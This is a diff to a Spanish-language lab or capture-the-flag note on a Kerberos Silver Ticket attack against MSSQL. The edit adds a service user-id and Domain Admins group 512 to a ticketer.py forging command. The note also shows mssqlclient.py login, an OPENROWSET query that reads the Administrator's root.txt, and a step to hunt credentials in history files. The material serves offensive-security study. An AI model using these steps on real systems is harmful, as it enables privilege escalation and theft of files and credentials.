@@ -9,7 +9,7 @@ tags: [windows, mssql, kerberos, silver-ticket, openrowset, privesc]
 
 ## Concepto
 
-Con el hash NTLM de la cuenta de servicio de MSSQL se puede forjar un TGS para el SPN `MSSQLSvc`. El ticket incluye grupos arbitrarios en el PAC, lo que permite entrar como `sysadmin`; `OPENROWSET(BULK ...)` lee archivos con esos grupos.
+Con el hash NTLM de la cuenta de servicio de MSSQL se puede forjar un TGS para el SPN `MSSQLSvc`. El ticket se emite con el user-id de la cuenta de servicio y grupos arbitrarios en el PAC, lo que permite entrar como `sysadmin`; `OPENROWSET(BULK ...)` lee archivos con esos grupos.
 
 ## Cuándo aplica
 
@@ -21,7 +21,7 @@ Con el hash NTLM de la cuenta de servicio de MSSQL se puede forjar un TGS para e
 
 1. Calcular el NTLM de la contraseña o crackear el NetNTLMv2.
 2. Obtener el SID del dominio y el RID de un grupo privilegiado.
-3. Forjar el ticket con `ticketer.py` y usarlo con `mssqlclient.py`.
+3. Forjar el ticket con `ticketer.py`, fijando el user-id del servicio y los grupos, y usarlo con `mssqlclient.py`.
 4. Leer archivos con `OPENROWSET`.
 5. Buscar credenciales en historiales.
 
@@ -29,7 +29,7 @@ Con el hash NTLM de la cuenta de servicio de MSSQL se puede forjar un TGS para e
 
 ```bash
 ticketer.py -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> \
-  -spn MSSQLSvc/DC01.<DOMAIN>:1433 -groups 1105 <USER>
+  -spn MSSQLSvc/DC01.<DOMAIN>:1433 -user-id 1103 -groups '512,1105' <USER>
 KRB5CCNAME=<USER>.ccache mssqlclient.py -no-pass -k DC01.<DOMAIN>
 SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
 ```
